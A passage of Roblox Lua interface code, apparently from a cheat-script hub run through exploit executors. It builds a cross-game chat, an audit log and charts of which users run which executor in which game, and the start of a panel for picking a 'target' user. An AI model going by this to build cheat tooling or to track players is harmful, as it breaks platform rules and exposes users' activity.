local ChatLayout = Instance.new("UIListLayout", ChatScrolling)
ChatLayout.SortOrder = Enum.SortOrder.LayoutOrder
ChatLayout.Padding = UDim.new(0, 4)

ChatLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ChatScrolling.CanvasSize = UDim2.new(0, 0, 0, ChatLayout.AbsoluteContentSize.Y + 8)
    ChatScrolling.CanvasPosition = Vector2.new(0, math.max(0, ChatScrolling.CanvasSize.Y.Offset - ChatScrolling.AbsoluteSize.Y))
end)

local EmojiBar = Instance.new("ScrollingFrame")
EmojiBar.Size = UDim2.new(1, 0, 0, 24)
EmojiBar.Position = UDim2.new(0, 0, 1, -62)
EmojiBar.BackgroundTransparency = 1
EmojiBar.BorderSizePixel = 0
EmojiBar.ScrollBarThickness = 0
EmojiBar.CanvasSize = UDim2.new(0, 440, 0, 0)
EmojiBar.ScrollingDirection = Enum.ScrollingDirection.X
EmojiBar.Parent = ChatView

local EmojiLayout = Instance.new("UIListLayout", EmojiBar)
EmojiLayout.FillDirection = Enum.FillDirection.Horizontal
EmojiLayout.SortOrder = Enum.SortOrder.LayoutOrder
EmojiLayout.Padding = UDim.new(0, 4)

local InputContainer = Instance.new("Frame")
InputContainer.Size = UDim2.new(1, 0, 0, 34)
InputContainer.Position = UDim2.new(0, 0, 1, -34)
InputContainer.BackgroundTransparency = 1
InputContainer.Parent = ChatView

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(1, -44, 1, 0)
TextBox.BackgroundColor3 = Color3.fromRGB(43, 45, 49)
TextBox.TextColor3 = Color3.fromRGB(242, 243, 245)
TextBox.PlaceholderColor3 = Color3.fromRGB(148, 155, 164)
TextBox.PlaceholderText = "Message #global-cross-chat... (Press Enter)"
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 13
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.ClearTextOnFocus = true
TextBox.Text = ""
TextBox.Parent = InputContainer
Instance.new("UIPadding", TextBox).PaddingLeft = UDim.new(0, 10)
Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 6)

local SendBtn = Instance.new("TextButton")
SendBtn.Size = UDim2.new(0, 38, 1, 0)
SendBtn.Position = UDim2.new(1, -38, 0, 0)
SendBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
SendBtn.Text = "🚀"
SendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SendBtn.Font = Enum.Font.GothamBold
SendBtn.TextSize = 13
SendBtn.Parent = InputContainer
Instance.new("UICorner", SendBtn).CornerRadius = UDim.new(0, 6)

local quickEmojis = {"😀", "😂", "🔥", "❤️", "💀", "👑", "🚀", "👍", "🎮", "⚡", "👋", "🎉", "✨", "👀", "💯"}
for _, em in ipairs(quickEmojis) do
    local emBtn = Instance.new("TextButton")
    emBtn.Size = UDim2.new(0, 26, 0, 22)
    emBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 42)
    emBtn.Text = em
    emBtn.TextSize = 12
    emBtn.Parent = EmojiBar
    Instance.new("UICorner", emBtn).CornerRadius = UDim.new(0, 4)
    emBtn.MouseButton1Click:Connect(function()
        TextBox.Text = TextBox.Text .. em .. " "
        TextBox:CaptureFocus()
    end)
end

local HistoryView = Instance.new("Frame")
HistoryView.Name = "HistoryView"
HistoryView.Size = UDim2.new(1, -20, 1, -16)
HistoryView.Position = UDim2.new(0, 10, 0, 8)
HistoryView.BackgroundTransparency = 1
HistoryView.Visible = false
HistoryView.Parent = ViewContainer

local HistoryHeader = Instance.new("Frame")
HistoryHeader.Size = UDim2.new(1, 0, 0, 26)
HistoryHeader.BackgroundTransparency = 1
HistoryHeader.Parent = HistoryView

local HistoryTitle = Instance.new("TextLabel")
HistoryTitle.Size = UDim2.new(0.4, 0, 1, 0)
HistoryTitle.BackgroundTransparency = 1
HistoryTitle.Text = "📊 # executor-history"
HistoryTitle.TextColor3 = Color3.fromRGB(242, 243, 245)
HistoryTitle.Font = Enum.Font.GothamBold
HistoryTitle.TextSize = 13
HistoryTitle.TextXAlignment = Enum.TextXAlignment.Left
HistoryTitle.Parent = HistoryHeader

local HistorySubTabContainer = Instance.new("Frame")
HistorySubTabContainer.Size = UDim2.new(0, 230, 0, 24)
HistorySubTabContainer.Position = UDim2.new(1, -230, 0, 1)
HistorySubTabContainer.BackgroundColor3 = Color3.fromRGB(24, 25, 28)
HistorySubTabContainer.BorderSizePixel = 0
HistorySubTabContainer.Parent = HistoryHeader
Instance.new("UICorner", HistorySubTabContainer).CornerRadius = UDim.new(0, 6)

local TabLogBtn = Instance.new("TextButton")
TabLogBtn.Size = UDim2.new(0.5, -2, 1, -4)
TabLogBtn.Position = UDim2.new(0, 2, 0, 2)
TabLogBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
TabLogBtn.Text = "📜 Audit Log"
TabLogBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
TabLogBtn.Font = Enum.Font.GothamBold
TabLogBtn.TextSize = 10
TabLogBtn.Parent = HistorySubTabContainer
Instance.new("UICorner", TabLogBtn).CornerRadius = UDim.new(0, 4)

local TabChartBtn = Instance.new("TextButton")
TabChartBtn.Size = UDim2.new(0.5, -2, 1, -4)
TabChartBtn.Position = UDim2.new(0.5, 0, 0, 2)
TabChartBtn.BackgroundTransparency = 1
TabChartBtn.Text = "📊 Analytics Chart"
TabChartBtn.TextColor3 = Color3.fromRGB(148, 155, 164)
TabChartBtn.Font = Enum.Font.GothamBold
TabChartBtn.TextSize = 10
TabChartBtn.Parent = HistorySubTabContainer
Instance.new("UICorner", TabChartBtn).CornerRadius = UDim.new(0, 4)

local StatCardsFrame = Instance.new("Frame")
StatCardsFrame.Size = UDim2.new(1, 0, 0, 52)
StatCardsFrame.Position = UDim2.new(0, 0, 0, 28)
StatCardsFrame.BackgroundTransparency = 1
StatCardsFrame.Parent = HistoryView

local function createStatCard(title, posScale, sizeScale)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(sizeScale, -6, 1, 0)
    card.Position = UDim2.new(posScale, 0, 0, 0)
    card.BackgroundColor3 = Color3.fromRGB(24, 25, 28)
    card.BorderSizePixel = 0
    card.Parent = StatCardsFrame
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 6)
    local cStroke = Instance.new("UIStroke", card)
    cStroke.Color = Color3.fromRGB(48, 50, 56)
    cStroke.Thickness = 1

    local tLabel = Instance.new("TextLabel")
    tLabel.Size = UDim2.new(1, -12, 0, 16)
    tLabel.Position = UDim2.new(0, 8, 0, 6)
    tLabel.BackgroundTransparency = 1
    tLabel.Text = title
    tLabel.TextColor3 = Color3.fromRGB(148, 155, 164)
    tLabel.Font = Enum.Font.GothamBold
    tLabel.TextSize = 9
    tLabel.TextXAlignment = Enum.TextXAlignment.Left
    tLabel.Parent = card

    local vLabel = Instance.new("TextLabel")
    vLabel.Size = UDim2.new(1, -12, 0, 22)
    vLabel.Position = UDim2.new(0, 8, 0, 22)
    vLabel.BackgroundTransparency = 1
    vLabel.Text = "0"
    vLabel.TextColor3 = Color3.fromRGB(242, 243, 245)
    vLabel.Font = Enum.Font.GothamBold
    vLabel.TextSize = 13
    vLabel.TextXAlignment = Enum.TextXAlignment.Left
    vLabel.TextTruncate = Enum.TextTruncate.AtEnd
    vLabel.Parent = card

    return vLabel
end

local StatUsersVal = createStatCard("👥 UNIQUE USERS", 0, 0.33)
local StatTopExecVal = createStatCard("⚡ TOP EXECUTOR", 0.335, 0.33)
local StatGamesVal = createStatCard("🎮 ACTIVE GAMES", 0.67, 0.33)

local FilterContainer = Instance.new("Frame")
FilterContainer.Size = UDim2.new(1, 0, 0, 28)
FilterContainer.Position = UDim2.new(0, 0, 0, 86)
FilterContainer.BackgroundTransparency = 1
FilterContainer.Parent = HistoryView

local ScrollLeftBtn = Instance.new("TextButton")
ScrollLeftBtn.Size = UDim2.new(0, 22, 1, 0)
ScrollLeftBtn.Position = UDim2.new(0, 0, 0, 0)
ScrollLeftBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 42)
ScrollLeftBtn.Text = "<"
ScrollLeftBtn.TextColor3 = Color3.fromRGB(220, 222, 226)
ScrollLeftBtn.Font = Enum.Font.GothamBold
ScrollLeftBtn.TextSize = 13
ScrollLeftBtn.Parent = FilterContainer
Instance.new("UICorner", ScrollLeftBtn).CornerRadius = UDim.new(0, 4)

ScrollLeftBtn.MouseEnter:Connect(function()
    ScrollLeftBtn.BackgroundColor3 = Color3.fromRGB(53, 55, 60)
end)
ScrollLeftBtn.MouseLeave:Connect(function()
    ScrollLeftBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 42)
end)

local HistoryFilterBar = Instance.new("ScrollingFrame")
HistoryFilterBar.Size = UDim2.new(1, -52, 1, 0)
HistoryFilterBar.Position = UDim2.new(0, 26, 0, 0)
HistoryFilterBar.BackgroundTransparency = 1
HistoryFilterBar.BorderSizePixel = 0
HistoryFilterBar.ScrollBarThickness = 4
HistoryFilterBar.ScrollBarImageColor3 = Color3.fromRGB(88, 101, 242)
HistoryFilterBar.AutomaticCanvasSize = Enum.AutomaticSize.X
HistoryFilterBar.CanvasSize = UDim2.new(0, 0, 0, 0)
HistoryFilterBar.ScrollingDirection = Enum.ScrollingDirection.X
HistoryFilterBar.Parent = FilterContainer

local HistoryFilterLayout = Instance.new("UIListLayout", HistoryFilterBar)
HistoryFilterLayout.FillDirection = Enum.FillDirection.Horizontal
HistoryFilterLayout.SortOrder = Enum.SortOrder.LayoutOrder
HistoryFilterLayout.Padding = UDim.new(0, 4)

HistoryFilterLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    HistoryFilterBar.CanvasSize = UDim2.new(0, HistoryFilterLayout.AbsoluteContentSize.X + 20, 0, 0)
end)

local ScrollRightBtn = Instance.new("TextButton")
ScrollRightBtn.Size = UDim2.new(0, 22, 1, 0)
ScrollRightBtn.Position = UDim2.new(1, -22, 0, 0)
ScrollRightBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 42)
ScrollRightBtn.Text = ">"
ScrollRightBtn.TextColor3 = Color3.fromRGB(220, 222, 226)
ScrollRightBtn.Font = Enum.Font.GothamBold
ScrollRightBtn.TextSize = 13
ScrollRightBtn.Parent = FilterContainer
Instance.new("UICorner", ScrollRightBtn).CornerRadius = UDim.new(0, 4)

ScrollRightBtn.MouseEnter:Connect(function()
    ScrollRightBtn.BackgroundColor3 = Color3.fromRGB(53, 55, 60)
end)
ScrollRightBtn.MouseLeave:Connect(function()
    ScrollRightBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 42)
end)

ScrollLeftBtn.MouseButton1Click:Connect(function()
    HistoryFilterBar.CanvasPosition = Vector2.new(math.max(0, HistoryFilterBar.CanvasPosition.X - 140), 0)
end)

ScrollRightBtn.MouseButton1Click:Connect(function()
    HistoryFilterBar.CanvasPosition = Vector2.new(HistoryFilterBar.CanvasPosition.X + 140, 0)
end)

local HistoryScroller = Instance.new("ScrollingFrame")
HistoryScroller.Size = UDim2.new(1, 0, 1, -120)
HistoryScroller.Position = UDim2.new(0, 0, 0, 120)
HistoryScroller.BackgroundTransparency = 1
HistoryScroller.BorderSizePixel = 0
HistoryScroller.ScrollBarThickness = 4
HistoryScroller.Parent = HistoryView

local HistoryLayout = Instance.new("UIListLayout", HistoryScroller)
HistoryLayout.SortOrder = Enum.SortOrder.LayoutOrder
HistoryLayout.Padding = UDim.new(0, 4)

HistoryLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    HistoryScroller.CanvasSize = UDim2.new(0, 0, 0, HistoryLayout.AbsoluteContentSize.Y + 10)
end)

local ChartScroller = Instance.new("ScrollingFrame")
ChartScroller.Size = UDim2.new(1, 0, 1, -88)
ChartScroller.Position = UDim2.new(0, 0, 0, 88)
ChartScroller.BackgroundTransparency = 1
ChartScroller.BorderSizePixel = 0
ChartScroller.ScrollBarThickness = 4
ChartScroller.Visible = false
ChartScroller.Parent = HistoryView

local ChartLayout = Instance.new("UIListLayout", ChartScroller)
ChartLayout.SortOrder = Enum.SortOrder.LayoutOrder
ChartLayout.Padding = UDim.new(0, 8)

ChartLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ChartScroller.CanvasSize = UDim2.new(0, 0, 0, ChartLayout.AbsoluteContentSize.Y + 20)
end)

local openUserProfile

local function refreshHistoryUI(historyData, usersData)
    for _, child in ipairs(HistoryScroller:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end
    for _, child in ipairs(ChartScroller:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end
    for _, child in ipairs(HistoryFilterBar:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end

    local entries = {}
    if historyData and type(historyData) == "table" and #historyData > 0 then
        entries = historyData
    else
        for _, u in ipairs(usersData or {}) do
            table.insert(entries, {
                username = u.username,
                user_id = u.user_id,
                executor = u.executor,
                current_game = u.current_game,
                logged_at = u.updated_at
            })
        end
    end

    local execCounts = {}
    local userSeen = {}
    local gamesSeen = {}
    local gameCounts = {}
    local totalEntries = #entries

    for _, e in ipairs(entries) do
        local exec = tostring(e.executor or "Unknown")
        execCounts[exec] = (execCounts[exec] or 0) + 1
        if e.username then userSeen[e.username] = true end
        if e.current_game then
            gamesSeen[e.current_game] = true
            gameCounts[e.current_game] = (gameCounts[e.current_game] or 0) + 1
        end
    end

    local topExecName = "None"
    local topExecCount = 0
    local sortedExecs = {}
    for name, count in pairs(execCounts) do
        table.insert(sortedExecs, { name = name, count = count })
        if count > topExecCount then
            topExecCount = count
            topExecName = name
        end
    end
    table.sort(sortedExecs, function(a, b) return a.count > b.count end)

    local sortedGames = {}
    for gName, gCount in pairs(gameCounts) do
        table.insert(sortedGames, { name = gName, count = gCount })
    end
    table.sort(sortedGames, function(a, b) return a.count > b.count end)

    local topPercent = totalEntries > 0 and math.floor((topExecCount / totalEntries) * 100) or 0
    local uniqueUsersCount = 0
    for _ in pairs(userSeen) do uniqueUsersCount = uniqueUsersCount + 1 end
    local uniqueGamesCount = 0
    for _ in pairs(gamesSeen) do uniqueGamesCount = uniqueGamesCount + 1 end

    StatUsersVal.Text = tostring(uniqueUsersCount > 0 and uniqueUsersCount or totalEntries)
    StatTopExecVal.Text = topExecName .. " (" .. topPercent .. "%)"
    StatGamesVal.Text = tostring(uniqueGamesCount)

    local function createFilterPill(label, targetFilter)
        local pill = Instance.new("TextButton")
        pill.Size = UDim2.new(0, 0, 1, 0)
        pill.AutomaticSize = Enum.AutomaticSize.X
        pill.BackgroundColor3 = (historyFilter == targetFilter) and Color3.fromRGB(88, 101, 242) or Color3.fromRGB(35, 37, 42)
        pill.Text = "  " .. label .. "  "
        pill.TextColor3 = Color3.fromRGB(242, 243, 245)
        pill.Font = Enum.Font.GothamBold
        pill.TextSize = 10
        pill.Parent = HistoryFilterBar
        Instance.new("UICorner", pill).CornerRadius = UDim.new(0, 4)
        pill.MouseButton1Click:Connect(function()
            historyFilter = targetFilter
            refreshHistoryUI(historyData, usersData)
        end)
    end

    createFilterPill("ALL (" .. totalEntries .. ")", "ALL")
    for _, item in ipairs(sortedExecs) do
        createFilterPill(item.name .. " (" .. item.count .. ")", item.name)
    end

    for _, item in ipairs(entries) do
        local uName = tostring(item.username or "Unknown")
        local uExec = tostring(item.executor or "Unknown")
        local uGame = tostring(item.current_game or "Roblox")
        local uTime = formatIsoToTime(item.logged_at)

        if historyFilter == "ALL" or historyFilter == uExec then
            local Row = Instance.new("Frame")
            Row.Size = UDim2.new(1, -6, 0, 44)
            Row.BackgroundColor3 = Color3.fromRGB(35, 37, 42)
            Row.BorderSizePixel = 0
            Row.Parent = HistoryScroller
            Instance.new("UICorner", Row).CornerRadius = UDim.new(0, 6)

            local Av = Instance.new("ImageButton")
            Av.Size = UDim2.new(0, 32, 0, 32)
            Av.Position = UDim2.new(0, 8, 0.5, -16)
            Av.BackgroundColor3 = Color3.fromRGB(24, 25, 28)
            Av.BorderSizePixel = 0
            Av.Image = getAvatarThumb(item.user_id, uName)
            Av.Parent = Row
            Instance.new("UICorner", Av).CornerRadius = UDim.new(1, 0)

            Av.MouseButton1Click:Connect(function()
                local found = nil
                for _, u in ipairs(cachedUsersData) do
                    if u.username == uName then
                        found = u
                        break
                    end
                end
                if not found then
                    found = {
                        username = uName,
                        user_id = item.user_id or 0,
                        is_admin = cachedAdminPool[uName] or false,
                        updated_at = item.logged_at,
                        current_game = uGame,
                        executor = uExec,
                        job_id = item.job_id or "none",
                        place_id = item.place_id or PlaceId
                    }
                end
                openUserProfile(found)
            end)

            local UserTagFrame = Instance.new("Frame")
            UserTagFrame.Size = UDim2.new(0.48, -48, 1, 0)
            UserTagFrame.Position = UDim2.new(0, 46, 0, 0)
            UserTagFrame.BackgroundTransparency = 1
            UserTagFrame.Parent = Row

            local UserTagLayout = Instance.new("UIListLayout", UserTagFrame)
            UserTagLayout.FillDirection = Enum.FillDirection.Horizontal
            UserTagLayout.VerticalAlignment = Enum.VerticalAlignment.Center
            UserTagLayout.Padding = UDim.new(0, 6)

            local NameLbl = Instance.new("TextLabel")
            NameLbl.Size = UDim2.new(0, 0, 1, 0)
            NameLbl.AutomaticSize = Enum.AutomaticSize.X
            NameLbl.BackgroundTransparency = 1
            NameLbl.Font = Enum.Font.GothamBold
            NameLbl.TextSize = 12
            NameLbl.TextColor3 = cachedAdminPool[uName] and Color3.fromRGB(255, 235, 59) or Color3.fromRGB(242, 243, 245)
            NameLbl.Text = (cachedAdminPool[uName] and "👑 " or "") .. uName
            NameLbl.TextXAlignment = Enum.TextXAlignment.Left
            NameLbl.Parent = UserTagFrame

            local ExecPill = Instance.new("Frame")
            ExecPill.Size = UDim2.new(0, 0, 0, 18)
            ExecPill.AutomaticSize = Enum.AutomaticSize.X
            ExecPill.BackgroundColor3 = getExecutorBadgeColor(uExec)
            ExecPill.BorderSizePixel = 0
            ExecPill.Parent = UserTagFrame
            Instance.new("UICorner", ExecPill).CornerRadius = UDim.new(0, 4)

            local ExecLbl = Instance.new("TextLabel")
            ExecLbl.Size = UDim2.new(0, 0, 1, 0)
            ExecLbl.AutomaticSize = Enum.AutomaticSize.X
            ExecLbl.BackgroundTransparency = 1
            ExecLbl.Font = Enum.Font.GothamBold
            ExecLbl.TextSize = 9
            ExecLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
            ExecLbl.Text = " ⚙️ " .. uExec .. " "
            ExecLbl.Parent = ExecPill

            local GameLbl = Instance.new("TextLabel")
            GameLbl.Size = UDim2.new(0.32, -10, 1, 0)
            GameLbl.Position = UDim2.new(0.52, 0, 0, 0)
            GameLbl.BackgroundTransparency = 1
            GameLbl.Font = Enum.Font.Gotham
            GameLbl.TextSize = 11
            GameLbl.TextColor3 = Color3.fromRGB(148, 155, 164)
            GameLbl.Text = "🎮 " .. uGame
            GameLbl.TextXAlignment = Enum.TextXAlignment.Left
            GameLbl.TextTruncate = Enum.TextTruncate.AtEnd
            GameLbl.Parent = Row

            local TimeLbl = Instance.new("TextLabel")
            TimeLbl.Size = UDim2.new(0, 60, 1, 0)
            TimeLbl.Position = UDim2.new(1, -68, 0, 0)
            TimeLbl.BackgroundTransparency = 1
            TimeLbl.Font = Enum.Font.Gotham
            TimeLbl.TextSize = 10
            TimeLbl.TextColor3 = Color3.fromRGB(120, 125, 134)
            TimeLbl.Text = uTime ~= "" and uTime or "Recent"
            TimeLbl.TextXAlignment = Enum.TextXAlignment.Right
            TimeLbl.Parent = Row
        end
    end

    local SectionHeader1 = Instance.new("Frame")
    SectionHeader1.Size = UDim2.new(1, 0, 0, 24)
    SectionHeader1.BackgroundTransparency = 1
    SectionHeader1.Parent = ChartScroller

    local SecTitle1 = Instance.new("TextLabel")
    SecTitle1.Size = UDim2.new(1, 0, 1, 0)
    SecTitle1.BackgroundTransparency = 1
    SecTitle1.Text = "📈 EXECUTOR MARKET SHARE & DISTRIBUTION"
    SecTitle1.TextColor3 = Color3.fromRGB(148, 155, 164)
    SecTitle1.Font = Enum.Font.GothamBold
    SecTitle1.TextSize = 10
    SecTitle1.TextXAlignment = Enum.TextXAlignment.Left
    SecTitle1.Parent = SectionHeader1

    local medals = {"🥇 #1", "🥈 #2", "🥉 #3"}
    for idx, item in ipairs(sortedExecs) do
        local sharePct = totalEntries > 0 and (item.count / totalEntries) or 0
        local sharePctText = string.format("%.1f%%", sharePct * 100)

        local BarCard = Instance.new("Frame")
        BarCard.Size = UDim2.new(1, -6, 0, 48)
        BarCard.BackgroundColor3 = Color3.fromRGB(33, 35, 40)
        BarCard.BorderSizePixel = 0
        BarCard.Parent = ChartScroller
        Instance.new("UICorner", BarCard).CornerRadius = UDim.new(0, 6)

        local InfoRow = Instance.new("Frame")
        InfoRow.Size = UDim2.new(1, -16, 0, 20)
        InfoRow.Position = UDim2.new(0, 8, 0, 6)
        InfoRow.BackgroundTransparency = 1
        InfoRow.Parent = BarCard

        local RankLbl = Instance.new("TextLabel")
        RankLbl.Size = UDim2.new(0, 36, 1, 0)
        RankLbl.BackgroundTransparency = 1
        RankLbl.Text = medals[idx] or ("#" .. idx)
        RankLbl.TextColor3 = (idx == 1 and Color3.fromRGB(255, 215, 0)) or (idx == 2 and Color3.fromRGB(192, 192, 192)) or (idx == 3 and Color3.fromRGB(205, 127, 50)) or Color3.fromRGB(148, 155, 164)
        RankLbl.Font = Enum.Font.GothamBold
        RankLbl.TextSize = 11
        RankLbl.TextXAlignment = Enum.TextXAlignment.Left
        RankLbl.Parent = InfoRow

        local ExecNameLbl = Instance.new("TextLabel")
        ExecNameLbl.Size = UDim2.new(0.5, 0, 1, 0)
        ExecNameLbl.Position = UDim2.new(0, 40, 0, 0)
        ExecNameLbl.BackgroundTransparency = 1
        ExecNameLbl.Text = "⚙️ " .. item.name
        ExecNameLbl.TextColor3 = Color3.fromRGB(242, 243, 245)
        ExecNameLbl.Font = Enum.Font.GothamBold
        ExecNameLbl.TextSize = 12
        ExecNameLbl.TextXAlignment = Enum.TextXAlignment.Left
        ExecNameLbl.Parent = InfoRow

        local ShareLbl = Instance.new("TextLabel")
        ShareLbl.Size = UDim2.new(0.4, 0, 1, 0)
        ShareLbl.Position = UDim2.new(0.6, 0, 0, 0)
        ShareLbl.BackgroundTransparency = 1
        ShareLbl.Text = string.format("%d users  •  %s", item.count, sharePctText)
        ShareLbl.TextColor3 = Color3.fromRGB(219, 222, 225)
        ShareLbl.Font = Enum.Font.GothamSemibold
        ShareLbl.TextSize = 11
        ShareLbl.TextXAlignment = Enum.TextXAlignment.Right
        ShareLbl.Parent = InfoRow

        local TrackBar = Instance.new("Frame")
        TrackBar.Size = UDim2.new(1, -16, 0, 8)
        TrackBar.Position = UDim2.new(0, 8, 0, 30)
        TrackBar.BackgroundColor3 = Color3.fromRGB(22, 23, 26)
        TrackBar.BorderSizePixel = 0
        TrackBar.Parent = BarCard
        Instance.new("UICorner", TrackBar).CornerRadius = UDim.new(1, 0)

        local FillBar = Instance.new("Frame")
        FillBar.Size = UDim2.new(math.clamp(sharePct, 0.015, 1), 0, 1, 0)
        FillBar.BackgroundColor3 = getExecutorBadgeColor(item.name)
        FillBar.BorderSizePixel = 0
        FillBar.Parent = TrackBar
        Instance.new("UICorner", FillBar).CornerRadius = UDim.new(1, 0)
    end

    local SectionHeader2 = Instance.new("Frame")
    SectionHeader2.Size = UDim2.new(1, 0, 0, 30)
    SectionHeader2.BackgroundTransparency = 1
    SectionHeader2.Parent = ChartScroller

    local SecTitle2 = Instance.new("TextLabel")
    SecTitle2.Size = UDim2.new(1, 0, 1, 0)
    SecTitle2.Position = UDim2.new(0, 0, 0, 6)
    SecTitle2.BackgroundTransparency = 1
    SecTitle2.Text = "🎮 TOP GAMES ACROSS NETWORK"
    SecTitle2.TextColor3 = Color3.fromRGB(148, 155, 164)
    SecTitle2.Font = Enum.Font.GothamBold
    SecTitle2.TextSize = 10
    SecTitle2.TextXAlignment = Enum.TextXAlignment.Left
    SecTitle2.Parent = SectionHeader2

    local topGameMax = (sortedGames[1] and sortedGames[1].count > 0) and sortedGames[1].count or 1
    for _, g in ipairs(sortedGames) do
        local gRatio = g.count / topGameMax

        local GCard = Instance.new("Frame")
        GCard.Size = UDim2.new(1, -6, 0, 42)
        GCard.BackgroundColor3 = Color3.fromRGB(28, 30, 34)
        GCard.BorderSizePixel = 0
        GCard.Parent = ChartScroller
        Instance.new("UICorner", GCard).CornerRadius = UDim.new(0, 6)

        local GName = Instance.new("TextLabel")
        GName.Size = UDim2.new(0.65, -12, 0, 18)
        GName.Position = UDim2.new(0, 8, 0, 4)
        GName.BackgroundTransparency = 1
        GName.Text = "🎮 " .. g.name
        GName.TextColor3 = Color3.fromRGB(242, 243, 245)
        GName.Font = Enum.Font.GothamSemibold
        GName.TextSize = 11
        GName.TextXAlignment = Enum.TextXAlignment.Left
        GName.TextTruncate = Enum.TextTruncate.AtEnd
        GName.Parent = GCard

        local GCount = Instance.new("TextLabel")
        GCount.Size = UDim2.new(0.35, -12, 0, 18)
        GCount.Position = UDim2.new(0.65, 0, 0, 4)
        GCount.BackgroundTransparency = 1
        GCount.Text = tostring(g.count) .. " active players"
        GCount.TextColor3 = Color3.fromRGB(120, 125, 134)
        GCount.Font = Enum.Font.Gotham
        GCount.TextSize = 10
        GCount.TextXAlignment = Enum.TextXAlignment.Right
        GCount.Parent = GCard

        local GTrack = Instance.new("Frame")
        GTrack.Size = UDim2.new(1, -16, 0, 6)
        GTrack.Position = UDim2.new(0, 8, 0, 26)
        GTrack.BackgroundColor3 = Color3.fromRGB(20, 21, 24)
        GTrack.BorderSizePixel = 0
        GTrack.Parent = GCard
        Instance.new("UICorner", GTrack).CornerRadius = UDim.new(1, 0)

        local GFill = Instance.new("Frame")
        GFill.Size = UDim2.new(math.clamp(gRatio, 0.02, 1), 0, 1, 0)
        GFill.BackgroundColor3 = Color3.fromRGB(59, 130, 246)
        GFill.BorderSizePixel = 0
        GFill.Parent = GTrack
        Instance.new("UICorner", GFill).CornerRadius = UDim.new(1, 0)
    end

    if currentHistorySubTab == "chart" then
        TabChartBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        TabChartBtn.BackgroundTransparency = 0
        TabChartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        TabLogBtn.BackgroundTransparency = 1
        TabLogBtn.TextColor3 = Color3.fromRGB(148, 155, 164)
        FilterContainer.Visible = false
        HistoryScroller.Visible = false
        ChartScroller.Visible = true
    else
        TabLogBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        TabLogBtn.BackgroundTransparency = 0
        TabLogBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        TabChartBtn.BackgroundTransparency = 1
        TabChartBtn.TextColor3 = Color3.fromRGB(148, 155, 164)
        FilterContainer.Visible = true
        HistoryScroller.Visible = true
        ChartScroller.Visible = false
    end
end

TabLogBtn.MouseButton1Click:Connect(function()
    currentHistorySubTab = "log"
    TabLogBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    TabLogBtn.BackgroundTransparency = 0
    TabLogBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    TabChartBtn.BackgroundTransparency = 1
    TabChartBtn.TextColor3 = Color3.fromRGB(148, 155, 164)

    FilterContainer.Visible = true
    HistoryScroller.Visible = true
    ChartScroller.Visible = false
end)

TabChartBtn.MouseButton1Click:Connect(function()
    currentHistorySubTab = "chart"
    TabChartBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    TabChartBtn.BackgroundTransparency = 0
    TabChartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    TabLogBtn.BackgroundTransparency = 1
    TabLogBtn.TextColor3 = Color3.fromRGB(148, 155, 164)

    FilterContainer.Visible = false
    HistoryScroller.Visible = false
    ChartScroller.Visible = true
end)

local ExecPanelFrame = Instance.new("Frame")
ExecPanelFrame.Size = UDim2.new(1, -20, 1, -20)
ExecPanelFrame.Position = UDim2.new(0, 10, 0, 10)
ExecPanelFrame.BackgroundTransparency = 1
ExecPanelFrame.Visible = false
ExecPanelFrame.Parent = ViewContainer

local TargetScroller = Instance.new("ScrollingFrame")
TargetScroller.Size = UDim2.new(0, 200, 1, 0)
TargetScroller.BackgroundColor3 = Color3.fromRGB(24, 25, 28)
TargetScroller.BorderSizePixel = 0
TargetScroller.ScrollBarThickness = 4
TargetScroller.Parent = ExecPanelFrame
local TargetLayout = Instance.new("UIListLayout", TargetScroller)
TargetLayout.Padding = UDim.new(0, 4)
Instance.new("UICorner", TargetScroller).CornerRadius = UDim.new(0, 6)

TargetLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    TargetScroller.CanvasSize = UDim2.new(0, 0, 0, TargetLayout.AbsoluteContentSize.Y + 10)
end)

local ControlPanel = Instance.new("Frame")
ControlPanel.Size = UDim2.new(1, -210, 1, 0)
ControlPanel.Position = UDim2.new(0, 210, 0, 0)
ControlPanel.BackgroundColor3 = Color3.fromRGB(35, 37, 42)
ControlPanel.BorderSizePixel = 0
ControlPanel.Parent = ExecPanelFrame
Instance.new("UICorner", ControlPanel).CornerRadius = UDim.new(0, 6)

local TopActionFrame = Instance.new("Frame")
TopActionFrame.Size = UDim2.new(1, 0, 0, 140)
TopActionFrame.BackgroundTransparency = 1
TopActionFrame.Parent = ControlPanel

local ActiveTargetTitle = Instance.new("TextLabel")
ActiveTargetTitle.Size = UDim2.new(1, 0, 0, 25)
ActiveTargetTitle.Position = UDim2.new(0, 10, 0, 5)
ActiveTargetTitle.BackgroundTransparency = 1
ActiveTargetTitle.Text = "Selected Target: none"
ActiveTargetTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ActiveTargetTitle.Font = Enum.Font.GothamBold
ActiveTargetTitle.TextSize = 13
